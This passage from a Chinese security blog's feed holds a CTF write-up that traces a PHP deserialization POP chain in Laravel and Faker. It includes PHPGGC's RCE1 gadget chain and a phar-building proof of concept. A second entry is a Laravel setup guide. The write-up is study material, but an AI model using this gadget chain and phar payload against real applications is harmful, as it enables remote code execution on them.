class="line">...</span><br></pre></td></tr></table></figure><p>可以看到Event这个类继承了Facade这个类,而Facade这个类又创建了工厂</p><p>那么我们可不可以理解为当even被初始化的时候创建了一个工场然后调用工厂中所拥有的BroadcastManager之下的PendingBroadcast类呢？</p><p>以上均是我瞎想的，肯定有错误，不要轻信，这么以一顿思考之后对于Laravel框架有了一定初步认识，不知道其他框架是怎么样子的。</p><p>经过前面一番思考，最终可以得出结论PendingBroadcast类肯定是会被调用的，并且很重要，应该不是那么容易被改掉的吧？大概</p><hr><p>这里主要是参考hpdoger师傅的博客</p><blockquote><p><a href="http://hpdoger.me/2019/01/09/Code-breaking-medium%E4%B9%8Blumenserial/" target="_blank" rel="noopener">http://hpdoger.me/2019/01/09/Code-breaking-medium%E4%B9%8Blumenserial/</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class PendingBroadcast</span><br><span class="line">&#123;</span><br><span class="line">   ...</span><br><span class="line">   ...</span><br><span class="line">    public function __construct(Dispatcher $events, $event)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;event = $event;</span><br><span class="line">        $this-&gt;events = $events;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;events-&gt;dispatch($this-&gt;event);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反序列化的突破口一般是需要需要找到魔法函数<strong>destruct|</strong>wakeup<br>回到主题PendingBroadcast类中__destruct()方法调用了一个evens类的dispatch方法并且传入了$this-&gt;event。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;events-&gt;dispatch($this-&gt;event);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use Illuminate\Contracts\Events\Dispatcher;</span><br></pre></td></tr></table></figure><p>先看下dispatch方法，可以看到PendingBroadcast类调用了一个Dispatcher类，我们往下探寻看下Dispatcher类是干什么的。好吧，其实并不需要看这个类是干什么的。</p><p>通过寻找<code>__call</code> 魔法函数我们可以重构Dispatcher类，我们可以找到（不是我找到）ValidGenerator类中<code>__call</code>方法中有一个<code>$res = call_user_func_array(array($this-&gt;generator, $name), $arguments)</code>也就是说我们只要控制了<code>array($this-&gt;generator, $name)</code>我们就可以执行任意方法，同样原理我们只需要构造generator类中不存在的<code>$name</code>方法便可以调用generator类中的<code>__call</code>方法重构这个<code>$name</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">class ValidGenerator</span><br><span class="line">&#123;</span><br><span class="line">    protected $generator;</span><br><span class="line">    protected $validator;</span><br><span class="line">    protected $maxRetries;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">    public function __call($name, $arguments)</span><br><span class="line">    &#123;</span><br><span class="line">        $i = 0;</span><br><span class="line">        do &#123;</span><br><span class="line">            $res = call_user_func_array(array($this-&gt;generator, $name), $arguments);</span><br><span class="line">            $i++;</span><br><span class="line">            if ($i &gt; $this-&gt;maxRetries) &#123;</span><br><span class="line">                throw new \OverflowException(sprintf(&apos;Maximum retries of %d reached without finding a valid value&apos;, $this-&gt;maxRetries));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; while (!call_user_func($this-&gt;validator, $res));</span><br><span class="line"></span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Generator类</p><p>这里Generator类中<code>__call</code>方法中<code>$method</code>以及<code>$attributes</code>全部都是可以控制的，分别对应前面的<code>$name</code>以及<code>$arguments</code>或者是对应前前面的<code>dispatch</code>以及<code>event</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class Generator</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">    public function __call($method, $attributes)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;format($method, $attributes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>跟进format，可以看到这里将$formatter作为回调函数，$arguments作为参数进行调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function format($formatter, $arguments = array())</span><br><span class="line">&#123;</span><br><span class="line">    return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进getFormatter,发现这里只将$formatter传入并且返回<code>$this-&gt;formatters[$formatter]</code>，但是这里$formatter的值是不可控的初值dispatch，这里陷入僵局（说实在话这里假如我自己看，是完全看不出来的），回到我们初始的目的，我们需要将<code>$this-&gt;getFormatter($formatter)</code>构造成一个我们可以控制的函数名来进行利用，我们可以想办法将<code>$this-&gt;getFormatter($formatter)</code>变成数组，于是数组的第一个键名为dispatch，键值任意，第二个键名随意，键值为我们想要控制的函数值（好像不用这么麻烦如果可以构造如dispatch=&gt;xxx，不就好了吗？？？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   public function getFormatter($formatter)</span><br><span class="line">   &#123;</span><br><span class="line">       if (isset($this-&gt;formatters[$formatter])) &#123;</span><br><span class="line">           return $this-&gt;formatters[$formatter];</span><br><span class="line">       &#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对没错，回头看了下PHPGGC的payload就是直接构造dispatch=&gt;xxx，可以看到<code>formatters</code>为之前定义的一个<br>变量protected $formatters = array()，这个是可以控制的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class Generator</span><br><span class="line">&#123;</span><br><span class="line">    protected $providers = array();</span><br><span class="line">    protected $formatters = array();</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>所以我们最终可以构造如下payload，这个是在PHPGGC中的payload，构造出<code>new \Faker\Generator($function)</code>，其中$function是我们想要的函数，$parameter是我们想要的值最终造成<code>return $this-&gt;formatters[$formatter]</code>变成<code>$this-&gt;formatters=dispatch-&gt;$function</code>而<code>call_user_func_array($this-&gt;getFormatter($formatter), $arguments)</code>变成了<code>call_user_func_array($function,$parameter)</code>最终构成RCE执行任意我们想执行的函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace GadgetChain\Laravel;</span><br><span class="line"></span><br><span class="line">class RCE1 extends \PHPGGC\GadgetChain\RCE</span><br><span class="line">&#123;</span><br><span class="line">    public static $version = &apos;5.4.27&apos;;</span><br><span class="line">    public static $vector = &apos;__destruct&apos;;</span><br><span class="line">    public static $author = &apos;cf&apos;;</span><br><span class="line"></span><br><span class="line">    public function generate(array $parameters)</span><br><span class="line">    &#123;</span><br><span class="line">        $function = $parameters[&apos;function&apos;];</span><br><span class="line">        $parameter = $parameters[&apos;parameter&apos;];</span><br><span class="line"></span><br><span class="line">        return new \Illuminate\Broadcasting\PendingBroadcast(</span><br><span class="line">            new \Faker\Generator($function),</span><br><span class="line">            $parameter</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好吧，到这里终于能解释一个PHPGGC的RCE了，以后如果想练习反序列化可以用这个练习，我觉得laravel框架反序列链远远不止PHPGGC的四个RCE，网上找了下就看到不同师傅各种操作。</p><hr><p>回到这个题目，我们可以直接用PHPGGC的RCE1构成payload,来吧试试看,我感觉行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace Illuminate\Broadcasting</span><br><span class="line">&#123;</span><br><span class="line">    class PendingBroadcast</span><br><span class="line">    &#123;</span><br><span class="line">        protected $events;</span><br><span class="line">        protected $event;</span><br><span class="line"></span><br><span class="line">        function __construct($events, $cmd)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;events = $events;</span><br><span class="line">            $this-&gt;event = $cmd;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace Faker</span><br><span class="line">&#123;</span><br><span class="line">    class Generator</span><br><span class="line">    &#123;</span><br><span class="line">        protected $formatters;</span><br><span class="line"></span><br><span class="line">        function __construct($function)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;formatters = [&apos;dispatch&apos; =&gt; $function];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace&#123;</span><br><span class="line">    $function = &apos;assert&apos;;</span><br><span class="line">    $parameters = &apos;phpinfo()&apos;;</span><br><span class="line">  $o=new \Illuminate\Broadcasting\PendingBroadcast(</span><br><span class="line">            new \Faker\Generator($function),</span><br><span class="line">            $parameter</span><br><span class="line">        );</span><br><span class="line">    $filename = &apos;poc.phar&apos;;// 后缀必须为phar，否则程序无法运行</span><br><span class="line">    file_exists($filename) ? unlink($filename) : null;</span><br><span class="line">    $phar=new Phar($filename);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;GIF89a&lt;?php __HALT_COMPILER(); &quot;);</span><br><span class="line">    $phar-&gt;setMetadata($o);</span><br><span class="line">    $phar-&gt;addFromString(&quot;foo.txt&quot;,&quot;bar&quot;);</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>可以说看到怀疑人生….</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://www.anquanke.com/post/id/170681" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170681</a><br><a href="http://hpdoger.me/2019/01/09/Code-breaking-medium%E4%B9%8Blumenserial/" target="_blank" rel="noopener">http://hpdoger.me/2019/01/09/Code-breaking-medium%E4%B9%8Blumenserial/</a><br><a href="http://m4p1e.com/web/20181224.html" target="_blank" rel="noopener">http://m4p1e.com/web/20181224.html</a><br><a href="https://www.anquanke.com/post/id/170681" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170681</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      PHP反序列化之寻找pop链入门练习主要是代码审计星球lumenserial题目复现，顺便再加深下我对Laravel框架的理解
    
    </summary>
    
      <category term="文章" scheme="https://museljh.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="php反序列化" scheme="https://museljh.github.io/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>从零开始学习PHP框架之laravel入门</title>
    <link href="https://museljh.github.io/2019/03/09/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0PHP%E6%A1%86%E6%9E%B6%E4%B9%8Blaravel%E5%85%A5%E9%97%A8/"/>
    <id>https://museljh.github.io/2019/03/09/从零开始学习PHP框架之laravel入门/</id>
    <published>2019-03-09T12:41:16.000Z</published>
    <updated>2019-03-09T12:46:03.105Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>现在大多数PHP项目都是基于框架进行开发的，所以学习PHP框架最了解PHP编写web应用程序有着十分重要的作用，也能让我们不仅仅从局部角度去思考一个漏洞为什么产生，而能够让我们以一种全局的眼观看待一个漏洞产生的始末。本文也主要是讲解如何熟练上手PHP框架。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="一、PHP框架的简要介绍"><a href="#一、PHP框架的简要介绍" class="headerlink" title="一、PHP框架的简要介绍"></a>一、PHP框架的简要介绍</h3><p>形象的来说，PHP框架 把 PHP 程序开发摆到了流水线上。换句话说，PHP开发框架有助于促进快速软件开发（RAD），这节约了你的时间，有助于创建更为稳定的程序，并减少开发者的重复编写代码的劳动。<br>我们通常认为PHP框架的作用相当于模型-视图-控制器（Model View<br>Controller）。MVC是种编程的架构模式，将业务逻辑从UI中分离出来，允许一个一个单独修改。它隔离了业务逻辑与 UI，允许其一改变而另一者不受影响；在 MVC 中，模型负责数据，视图负责表现，控制器则是程序主体或者说是负责业务逻辑。从本质上说，MVC 拆分了一个程序的开发过程，这样你就可以修改独立的每一部分，而其他部分不受影响。这是十分重要的，它使得编写 PHP 代码更为快捷简单。<br>PHP框架 已经对常见的安全性如表单检测、SQL注入等常见的安全问题做了一定的内置处理。当然，不是用上 PHP 就绝对安全了，最重要的还是要程序开发人员自己有安全意识与经验。</p><h3 id="二、php常见框架"><a href="#二、php常见框架" class="headerlink" title="二、php常见框架"></a>二、php常见框架</h3><p>在Github上搜索PHP<br><img src="https://i.imgur.com/NhuUm1c.png" alt=""><br><img src="https://i.imgur.com/7cvJJLQ.png" alt=""><br>在过去几年中，Lavarel有很明显的优势一直处在最热门PHP框架的冠军位置，同样在2019年也是如此，在Github star数甚至是第二名的差不多2.5倍可见它的受欢迎程度。当然常见框架除了laravel还有symfony、CodeIgniter、yii2、cakephp、ZendFramework当然还有国产的THinkPHP，<br>在谷歌走势图中<br><img src="https://i.imgur.com/A72fBJf.png" alt=""><br>laravel在世界始终是排名第一，并且远远超过其他<br>但是在中国PHP框架使用最多的却是yii这里并不包括thinkphp<br><img src="https://i.imgur.com/VijZmEt.png" alt=""><br>具体原因很多，主要原因可能是国内还需要科学上网的原因？或者是laravel学习门槛要比ThinkPHP高很多的原因。反正原因很多，<br>在中国还是thinkPHP以及yii2比较流行</p><h3 id="三、如何上手一个新的框架"><a href="#三、如何上手一个新的框架" class="headerlink" title="三、如何上手一个新的框架"></a>三、如何上手一个新的框架</h3><p>如今的PHP框架层出不穷，我该如何才能更快地开始使用某个新的框架呢?最简单的方式就是练习几个简单的demo来熟悉这个框架<br>1、你好世界（hello world）<br>这里练习的必要性我就不多作说明了。在一个新的框架上构建一个应用，在页面中显示“‘hello world”。当然，做起来不会那么简单。</p><p>2、计算器（calculator）<br>写一个简单的计算器程序，结合表单，对两个操作数进行加减乘除等运算，并把结果输出到页面上。你需要为每一种运算设置单独的动作，或者说方法（每个框架的叫法不一样），而且还要用到框架中的表单验证功能（如果框架提供了这一功能的话）。</p><p>3、留言板（guestbook）<br>让我们回到1998年——建立一个留言本程序，在页面上显示一个表单让用户填写，然后提交到这个应用程序里，继而存储到数据库或文本文件中（视你自己的情况而定），并把用户留言的内容显示到页面上。如果框架提供了创建HTML表单、对象模型或层等功能，就用上它们吧。</p><p>4、解析和分页（parse and paginate）<br>选一个RSS源或其他XML源，解析其中的条目并显示出来。同时添加一个分页的功能，让用户可以五条五条地浏览，并在页面的顶部或底部添加页码。如果框架里提供了这样的功能，就使用它吧。</p><p>完成以上的练习后，你应该就可以清楚地知道如何使用这个框架了，并能用它完成更复杂的工作，或是继续探索这个框架的其他功能。如果你还是不会用，或者花了很多时间来完成以上练习，那么我觉得这个框架不适合你，还是找些其他的来用吧。</p><p>记住，如果在使用框架的过程中遇到困难，记得去该框架的社区里寻求帮助。一个有这强大社区支持的框架会为你未来的工作带来很大帮助，同时也表明这个框架是个不错的框架。没有人希望在使用某框架后的六个月，框架的开发者就宣布停止开发，这就太气人了。</p><h3 id="四、laravel"><a href="#四、laravel" class="headerlink" title="四、laravel"></a>四、laravel</h3><p>毕竟laravel毕竟是全球目前最受欢迎的php框架，我们第二个学习的目标就是它。</p><h3 id="关于Laravel"><a href="#关于Laravel" class="headerlink" title="关于Laravel"></a>关于Laravel</h3><p>Laravel是一个具有表现力，优雅语法的Web应用程序框架。我们相信，发展必须是一种愉快和创造性的体验才能真正实现。Laravel通过简化许多Web项目中使用的常见任务来消除开发中的痛苦，例如：</p><p>简单，快速的路由引擎。<br>强大的依赖注入容器。<br>用于会话和缓存存储的多个后端。<br>富有表现力的直观数据库ORM。<br>数据库无关模式迁移。<br>强大的后台工作处理。<br>实时事件广播。<br>Laravel易于访问，功能强大，并提供大型，强大的应用程序所需的工具。</p><h3 id="1、Laravel学习地址"><a href="#1、Laravel学习地址" class="headerlink" title="1、Laravel学习地址"></a>1、Laravel学习地址</h3><p>关于Laravel的学习我们可以在如下网站进行学习</p><blockquote><p><a href="https://laravel.com/docs/5.7" target="_blank" rel="noopener">https://laravel.com/docs/5.7</a><br><a href="https://laracasts.com/series/laravel-from-scratch-2018" target="_blank" rel="noopener">https://laracasts.com/series/laravel-from-scratch-2018</a><br><a href="https://www.kancloud.cn/tonyyu/laravel_5_6/786050" target="_blank" rel="noopener">https://www.kancloud.cn/tonyyu/laravel_5_6/786050</a></p></blockquote><h3 id="2-Composer安装"><a href="#2-Composer安装" class="headerlink" title="2.Composer安装"></a>2.Composer安装</h3><blockquote><p><a href="https://getcomposer.org/download/" target="_blank" rel="noopener">https://getcomposer.org/download/</a></p></blockquote><blockquote><p><a href="https://learnku.com/docs/lumen/5.7/installation/2402" target="_blank" rel="noopener">https://learnku.com/docs/lumen/5.7/installation/2402</a></p></blockquote><blockquote><p><a href="https://segmentfault.com/a/1190000011858458" target="_blank" rel="noopener">https://segmentfault.com/a/1190000011858458</a></p></blockquote><blockquote><p><a href="https://www.jianshu.com/p/7c745aa026ea" target="_blank" rel="noopener">https://www.jianshu.com/p/7c745aa026ea</a></p></blockquote><h4 id="一-安装"><a href="#一-安装" class="headerlink" title="一.安装"></a>一.安装</h4><p>在中国建议使用如下命令进行安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php -r &quot;copy(&apos;https://install.phpcomposer.com/installer&apos;, &apos;composer-setup.php&apos;);&quot;</span><br><span class="line"></span><br><span class="line">php composer-setup.php</span><br><span class="line"></span><br><span class="line">php -r &quot;unlink(&apos;composer-setup.php&apos;);&quot;</span><br></pre></td></tr></table></figure><h4 id="二-全局安装"><a href="#二-全局安装" class="headerlink" title="二.全局安装"></a>二.全局安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mv composer.phar /usr/local/bin/composer</span><br></pre></td></tr></table></figure><h4 id="三-更换Composer源"><a href="#三-更换Composer源" class="headerlink" title="三.更换Composer源"></a>三.更换Composer源</h4><p>Composer国外的源非常不稳定，建议更换成国内的源</p><p>方法一.修改 composer 的全局配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer config -g repo.packagist composer https://packagist.phpcomposer.com</span><br></pre></td></tr></table></figure><p>方法二.修改当前项目的 composer.json 配置文件<br>打开命令行窗口（windows用户）或控制台（Linux、Mac 用户），进入你的项目的根目录（也就是 composer.json 文件所在目录），执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer config repo.packagist composer https://packagist.phpcomposer.com</span><br></pre></td></tr></table></figure><h4 id="四-Composer安装Laravel-不建议巨麻烦"><a href="#四-Composer安装Laravel-不建议巨麻烦" class="headerlink" title="四.Composer安装Laravel(不建议巨麻烦)"></a>四.Composer安装Laravel(不建议巨麻烦)</h4><p>这种方法巨傻逼，会遇到一堆问题，千万不要尝试,我就是尝试了下，差点疯了。<br>通过Composer安装Laravel有两种方法</p><p>注意 ！！！<br>安装的时候一定要满足如下这些条件，不然会出现一堆让你怀疑人生的问题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PHP&gt; = 7.1.3</span><br><span class="line">OpenSSL PHP扩展</span><br><span class="line">PDO PHP扩展</span><br><span class="line">Mbstring PHP扩展</span><br><span class="line">Tokenizer PHP扩展</span><br><span class="line">XML PHP扩展</span><br><span class="line">Ctype PHP扩展</span><br><span class="line">JSON PHP扩展</span><br><span class="line">BCMath PHP扩展</span><br></pre></td></tr></table></figure></p><p>首先安装依赖<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install php7.2-xml</span><br><span class="line"></span><br><span class="line">sudo apt-get install php-mbstring</span><br></pre></td></tr></table></figure></p><p>1.通过 Laravel 安装器<br>首先，通过使用 Composer 安装 Laravel 安装器：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer global require &quot;laravel/installer&quot;</span><br></pre></td></tr></table></figure></p><p>注意：这里需要安装一个PHP插件-zip extension 否则会出现如下错误<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"> Problem 1</span><br><span class="line">    - laravel/installer v2.0.1 requires ext-zip * -&gt; the requested PHP extension zip is missing from your system.</span><br><span class="line">    - laravel/installer v2.0.0 requires ext-zip * -&gt; the requested PHP extension zip is missing from your system.</span><br><span class="line">    - Installation request for laravel/installer ^2.0 -&gt; satisfiable by laravel/installer[v2.0.0, v2.0.1].</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>安装zip extension插件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># For php v7.0</span><br><span class="line">sudo apt-get install php7.0-zip</span><br><span class="line"></span><br><span class="line"># For php v7.1</span><br><span class="line">sudo apt-get install php7.1-zip</span><br><span class="line"></span><br><span class="line"># For php v7.2</span><br><span class="line">sudo apt-get install php7.2-zip</span><br></pre></td></tr></table></figure></p><p>配置PATH环境变量</p><p>将 ~/.composer/vendor/bin 添加到 PATH 环境变量中，这样可执行文件 laravel 就能被你的系统检测到了。</p><p>编辑 ~/.bash_profile 文件， vim ~/.bash_profile 加入如下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=&quot;~/.composer/vendor/bin:$PATH&quot;</span><br></pre></td></tr></table></figure></p><p>或者直接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=&quot;~/.composer/vendor/bin:$PATH&quot;</span><br></pre></td></tr></table></figure></p><p>这里要注意使用Laravel5.1以上版本的时候需要使用一下命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=&quot;~/.config/composer/vendor/bin:$PATH&quot;</span><br></pre></td></tr></table></figure></p><p>这时候</p><p>装完成后， laravel new 命令会在您指定的目录创建一个全新的 Laravel 项目。例如， laravel new blog 将会创建一个名为 blog 的目录，并已安装好所有的 Laravel 依赖项：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">laravel new blog</span><br></pre></td></tr></table></figure></p><ul><li>为什么 Composer 可以安装 Laravel 框架呢？</li></ul><p>其实 Laravel框架也是一个 Composer包，我们可以通过如下命令查看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer show --all laravel/laravel</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">...</span><br><span class="line">name     : laravel/laravel</span><br><span class="line">descrip. : The Laravel Framework.</span><br><span class="line">keywords : framework, laravel</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>2.通过 Laravel 安装器</p><p>通过 Composer 的 create-project 命令来安装 Laravel 应用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist laravel/laravel blog</span><br></pre></td></tr></table></figure><p>使用这种方法时候可能也会踩如上的坑，如果想使用这种方法请看上面</p><p>3.具体实践一下<br>我们拿一个CTF题目进行搭建，题目源码来自代码审计星球。</p><blockquote><p><a href="https://code-breaking.com/puzzle/7/" target="_blank" rel="noopener">https://code-breaking.com/puzzle/7/</a></p></blockquote><p>下载并将其放入需要安装目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Composer install</span><br></pre></td></tr></table></figure><p>如果您在本地安装了 PHP，并且您想使用 PHP内置的服务器来为您的应用程序提供服务，可以使用以下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -S 0.0.0.0:8000 -t html</span><br></pre></td></tr></table></figure><p>可以愉快做题了。</p><h3 id="3-Homestead安装"><a href="#3-Homestead安装" class="headerlink" title="3.Homestead安装"></a>3.Homestead安装</h3><blockquote><p><a href="https://www.kancloud.cn/tonyyu/laravel_5_6/786195" target="_blank" rel="noopener">https://www.kancloud.cn/tonyyu/laravel_5_6/786195</a></p></blockquote><blockquote><p><a href="https://www.jianshu.com/p/aca8305eb392" target="_blank" rel="noopener">https://www.jianshu.com/p/aca8305eb392</a></p></blockquote><h3 id="以CTF题目讲解laravel目录结构"><a 